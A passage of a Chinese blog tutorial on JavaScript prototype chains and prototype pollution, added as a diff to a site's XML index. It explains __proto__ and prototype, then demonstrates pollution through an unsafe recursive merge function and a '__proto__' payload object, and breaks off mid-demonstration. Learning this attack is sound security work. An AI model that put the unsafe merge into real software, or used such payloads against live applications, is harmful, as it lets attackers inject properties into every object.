@@ -355,4 +355,941 @@
         <tag>JAVA</tag>
       </tags>
   </entry>
+  <entry>
+    <title>从Javascript原型链污染到python原型链污染1</title>
+    <url>/2023/07/10/%E4%BB%8EJavascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%931/</url>
+    <content><![CDATA[<h1 id="从Javascript原型链污染到python原型链污染"><a href="#从Javascript原型链污染到python原型链污染" class="headerlink" title="从Javascript原型链污染到python原型链污染"></a>从Javascript原型链污染到python原型链污染</h1><h3 id="一、javascript原型链污染"><a href="#一、javascript原型链污染" class="headerlink" title="一、javascript原型链污染"></a>一、javascript原型链污染</h3><h4 id="1、proto-和-prototype"><a href="#1、proto-和-prototype" class="headerlink" title="1、proto 和 prototype"></a>1、<strong>proto</strong> 和 prototype</h4><p>关于proto和prototype是javascript中两个重要的属性，我们要想要搞明白javascript的原型链污染，首先要明白proto和prototype。</p>
+<p>这里粘一张图，帮助大家更好理解：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701211126945.png"
+                      alt="image-20230701211126945"
+                ></p>
+<h5 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><strong>prototype</strong></h5><p>在javascript中关于prototype的解释是：每个js对象一定对应一个原型对象，并从原型对象继承属性和方法，但不是每个对象都有<code>__proto__</code>属性来标识自己所继承的原型，只有函数才有<code>prototype</code>属性。可能这样说不是很好理解，简单来说就是：我们都知道javascript是面向对象的，每个函数都有一个对象，每个对象都有一个prototype属性，这个属性是一个指针，指向我们的原型对象。并且这些对象都会有一个<strong>constructor</strong> 属性，这个属性指向所关联的构造函数。</p>
+<p>下面我们通过两个例子来分析一下prototype属性:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;这里是测试&#x27;</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">var</span> person1 =<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property"><span class="keyword">prototype</span></span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701204410150.png"
+                      alt="image-20230701204410150"
+                ></p>
+<p>经过测试我们可以看到函数Person的原型是object{constructor:function Person()},但是我们实例化出来的非函数对象person1是没有原型的，这就验证了我们上面说的只有函数才有prototype属性。</p>
+<p>prototype原型对象还有一个利用是我们可以使用它实现属性和方法的继承。</p>
+<p>具体我们来通过一个示例代码来了解：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;test&#x27;</span> <span class="comment">//定义一个构造函数Person</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params"></span>) &#123; &#125; <span class="comment">//定义另一个构造函数</span></span><br><span class="line"><span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Person</span>() <span class="comment">//实现Teacher上面的原型继承Person上面的所有属性。</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Teacher</span>();<span class="comment">//实例化一个Teache对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>);<span class="comment">//通过我们实例化的Teacher对象调用person函数的属性</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701205641379.png"
+                      alt="image-20230701205641379"
+                ></p>
+<p>我们可以看到我们实例化的Teacher对象成功调用了Person函数的属性，这说明Teache的原型继承了Person函数的属性和方法。</p>
+<p>除了这些我们还可以通过prototype来给对象添加属性或函数</p>
+<p>example:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123; &#125; <span class="comment">//这里定义一个构造函数Person</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span> = <span class="string">&quot;test&quot;</span>;<span class="comment">//通过原型添加一个name属性</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">say</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="comment">//通过原型添加一个say方法</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>);</span><br><span class="line">person.<span class="title function_">say</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701210526848.png"
+                      alt="image-20230701210526848"
+                ></p>
+<p>通过运行结果我们可以看出我们的实例化对象可以正常访问我们添加的属性和方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701210903744.png"
+                      alt="image-20230701210903744"
+                ></p>
+<h5 id="proto"><a href="#proto" class="headerlink" title="proto"></a><strong>proto</strong></h5><p>在上面我们讲了prototype,这里我们讲一下proto，proto属性也是javascript中的一个重要属性，但是proto和prototype不同的一点是proto存在与所有对象的属性里面，<strong>proto</strong>属性是在调用构造函数创建实例对象时产生的，这时因为当一个对象被创建时，这个构造函数将会把它的属性 prototype 赋给新对象的内部属性<code>__proto__</code>，于是这个<code>__proto__</code>被这个实例对象用来查找创建它的构造函数的prototype属性。</p>
+<p>这里我通过例子来理解：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;q111&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sayName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Test</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="title class_">Test</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">var</span> test=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Test</span>.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701212728495.png"
+                      alt="image-20230701212728495"
+                ></p>
+<p>我们可以看到proto无论在那个对象里面都存在，并且我们实例化的对象经过proto会执行其构造函数的原型对象。所有我们总结可得proto是用来将对象与该对象的原型相连。</p>
+<h4 id="2、proto和prototype的关系"><a href="#2、proto和prototype的关系" class="headerlink" title="2、proto和prototype的关系"></a>2、proto和prototype的关系</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;q111&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sayName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1=<span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">__proto__</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701213443077.png"
+                      alt="image-20230701213443077"
+                ></p>
+<p>可以看到我们的实例化对象的proto是等于构造函数的原型对象的，所有说proto是指向了构造函数的原型。</p>
+<p>3.Function.prototype</p>
+<p>每个 JavaScript 函数实际上都是一个 <code>Function</code> 对象。运行 <code>(function()&#123;&#125;).constructor === Function // true</code> 便可以得到这个结论。在我们代码中的构造函数、内置对象都是由 <strong>Function</strong> 创建的,通过 new 调用可以生成函数对象,比如自己创建的Person构造函数，以及<code>Number、String、Boolean、Object、Error、Array、RegExp、Date、Function</code>等内部对象。</p>
+<p>那么这样的话这些函数的proto指向的就是function.prototype,所以说 <strong>Fucntion</strong> <code>这个函数的prototype</code> 是所有函数的 <strong>proto</strong> ，有 call, apply等方法。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">__proto__</span> === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply</span>.<span class="property">__proto__</span> === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="property">__proto__</span> === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701214500067.png"
+                      alt="image-20230701214500067"
+                ></p>
+<p>用其他师傅博客的图更好的理解：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701214552500.png"
+                      alt="image-20230701214552500"
+                ></p>
+<h4 id="3、Object-prototype-proto"><a href="#3、Object-prototype-proto" class="headerlink" title="3、Object.prototype.proto"></a>3、Object.prototype.proto</h4><p>每个实例对象（object）都有一个私有属性（称之为<code> __proto__</code> ）指向它的构造函数的原型对象<strong>prototype</strong>。该原型对象也有一个自己的原型对象（<code>__proto__</code>），层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。当查到null就可以停止原型链的搜索。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701214925747.png"
+                      alt="image-20230701214925747"
+                ></p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([].<span class="property">__proto__</span>.<span class="property">__proto__</span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230701215104662.png"
+                      alt="image-20230701215104662"
+                ></p>
+<p>同样的，我们上边创建的构造函数 <strong>Person</strong>，它的 <code>prototype</code> 属性就是有 <strong>Object</strong> 创建的，所以 <strong>Object</strong> 将自己的 <code>prototype</code> 属性,扔给了 <strong>Person</strong> 的原型的 <code>__proto__</code> 属性。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701215249942.png"
+                      alt="image-20230701215249942"
+                ></p>
+<p>那么到这里我们可能会想function.prototype指向的是什么？</p>
+<p>我们这里通过代码来探索：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701215456715.png"
+                      alt="image-20230701215456715"
+                ></p>
+<p>我们通过运行结果可以看到指向了obiect,那我们可以将<code>fuction()&#123;&#125;</code>看成对象 <strong>Object</strong> 的实例。那么这里就和上面一样了。</p>
+<h4 id="4、什么是原型链"><a href="#4、什么是原型链" class="headerlink" title="4、什么是原型链"></a>4、什么是原型链</h4><p>这样层层向上的原型对象我们称为原型链，原型链的最上层是Object.prototype，并且它的原型是null，<code>null</code>表示原型链的终点，意味着它没有继续的原型对象，即没有原型链上的父级对象。这是为了确保原型链的结束，避免无限循环和属性查找的死循环。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701220419778.png"
+                      alt="image-20230701220419778"
+                ></p>
+<p>这里我们通过一个图更好的理解：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701213931041.png"
+                      alt="image-20230701213931041"
+                ></p>
+<p>当我们使用原型让一个函数的继承另一个函数的属性和方法，当我们访问实例对象的某个属性时会现在这个对象本身的属性上面寻找如果没有找到，则会通过__proto__ 属性去原型上面找，则会在构造函数的原型的<code>__proto__</code>中去找，这样一层层向上查找就会形成一个作用域链，称为原型链。</p>
+<p>具体实现我们通过一个代码示例来理解：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sex</span>=<span class="string">&#x27;男&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&#x27;test1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">b.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="keyword">var</span> B=<span class="keyword">new</span> <span class="title function_">b</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(B.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(B.<span class="property">sex</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701220724568.png"
+                      alt="image-20230701220724568"
+                ></p>
+<h4 id="5、原型链污染"><a href="#5、原型链污染" class="headerlink" title="5、原型链污染"></a>5、原型链污染</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f=<span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(F.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">__proto__</span> === F.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707140718684.png"
+                      alt="image-20230707140718684"
+                ></p>
+<p>由上面例子我们可以得到实例化对象f.__proto__和F.prototype，是相等的，都是等于object</p>
+<p>那么我们修改f.___proto__的值会不会改变F类</p>
+<p>我们通过一个代码进行测试:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个基类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BaseClass</span> &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个实例化对象</span></span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title class_">BaseClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用原型对象的方法</span></span><br><span class="line">obj.<span class="title function_">greet</span>(); <span class="comment">// Hello!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改原型对象的方法</span></span><br><span class="line"><span class="keyword">const</span> modifiedProto = &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Oops, prototype pollution!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">__proto__</span> = modifiedProto;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型链污染生效</span></span><br><span class="line">obj.<span class="title function_">greet</span>(); <span class="comment">// Oops, prototype pollution!</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707142415723.png"
+                      alt="image-20230707142415723"
+                ></p>
+<p>可以看到第一次执行greet方法和第二次执行的是不一样的，而且我们并不是直接去修改BaseClass中great的值，而是把obj.___proto__赋了一个新的greet函数内容</p>
+<p>我们在这里把修改前后，obj的__proto__打印出来</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseClass</span> &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title class_">BaseClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>)</span><br><span class="line"><span class="keyword">const</span> modifiedProto = &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Oops, prototype pollution!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">__proto__</span> = modifiedProto;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707143201455.png"
+                      alt="image-20230707143201455"
+                ></p>
+<p>我们通过直接修改 <code>obj</code> 对象的 <code>__proto__</code> 属性，将其设置为另一个对象 <code>modifiedProto</code>，该对象具有重新定义的 <code>greet</code> 方法。这导致了原型链污染，现在 <code>obj</code> 对象调用的 <code>greet</code> 方法变为了被修改后的版本，输出 “Oops, prototype pollution!”。</p>
+<p>这里obj在调用greet()方法时回先在自身找属性或者方法，如果找不到就会沿着原型链向上查找，而现在原型链的第一个对象是</p>
+<p>modifiedProto，而在这个对象里面就有greet()方法，然后就可以直接调用。</p>
+<p>再看一个简单的例子：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">name</span>=<span class="string">&quot;xiaohong&quot;</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">name</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707164523200.png"
+                      alt="image-20230707164523200"
+                ></p>
+<p>可以看到我们并没有在b中定义name属性</p>
+<p>但是我们污染后可以访问b.name</p>
+<p>具体我们通过下面代码看一下：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>)</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">name</span>=<span class="string">&quot;xiaohong&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>)</span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">name</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707165420320.png"
+                      alt="image-20230707165420320"
+                ></p>
+<p>可以看到我们a.<strong>proto</strong>.name&#x3D;”xiaohong”赋值后在object中多了name的属性值，这是因为a.__proto__就是object，那我这行代码就是object中插入了一个name属性</p>
+<p>那么我们b.name在自身对象找不到属性时，就会沿着原型链向上查找，到object找到了name属性，然后就会输出。</p>
+<h4 id="6、原型链污染的利用（此部分只是以一个复现）"><a href="#6、原型链污染的利用（此部分只是以一个复现）" class="headerlink" title="6、原型链污染的利用（此部分只是以一个复现）"></a>6、原型链污染的利用（此部分只是以一个复现）</h4><h5 id="对象merge"><a href="#对象merge" class="headerlink" title="对象merge"></a>对象merge</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以看到在合并的过程中的存在一个</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[key] = source[key]</span><br></pre></td></tr></table></figure></div>
+
+<p>这里是一个赋值操作</p>
+<p>那么如果我们这里的这个key是一个__proto__,那我们就可以进行原型链污染</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123; a: 1, &quot;__proto__&quot;: &#123; b: 2 &#125; &#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707171113748.png"
+                      alt="image-20230707171113748"
+                ></p>
+<p>但是根据运行结果我们可以看到并没有污染成功</p>
+<p>这是因为我们是通过</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">let o2 = &#123; a: 1, &quot;__proto__&quot;: &#123; b: 2 &#125; &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里打一个输出：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707174238227.png"
+                      alt="image-20230707174238227"
+                ></p>
+<p>可以看到这里输出的键值是[a,b],而不是__proto__,这是我们在遍历键值时__proto__代表o2的原型，而不是一个可以key</p>
+<p>那么就无法成功修改object的原型</p>
+<p>修改一下代码：</p>
